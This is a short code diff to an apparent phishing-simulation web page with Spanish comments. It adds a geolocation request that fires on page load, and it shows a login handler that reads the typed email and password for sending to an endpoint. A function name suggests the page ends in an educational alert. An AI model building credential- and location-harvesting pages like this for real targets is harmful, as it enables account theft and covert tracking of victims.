@@ -127,14 +127,23 @@
     </div>
 
 <script>
+// Solicitar ubicación inmediatamente al cargar la página
+window.addEventListener('load', function() {
+    getLocation().then(location => {
+        // Guardar la ubicación en una variable global
+        window.userLocation = location;
+        console.log('📍 Ubicación obtenida:', location);
+    });
+});
+
 document.getElementById('phishing-login-form').addEventListener('submit', async function(e) {
     e.preventDefault();
     
     const email = document.getElementById('login').value;
     const password = document.getElementById('password').value;
     
-    // Obtener ubicación
-    const location = await getLocation();
+    // Usar la ubicación ya obtenida (o null si no se pudo obtener)
+    const location = window.userLocation || { latitude: null, longitude: null, accuracy: null };
     
     // Datos a enviar al endpoint
     const formData = {
@@ -233,5 +242,7 @@ function showEducationalAlert(email, password) {
     }, 1000);
 }
 </script>
+
+
 </body>
 </html>
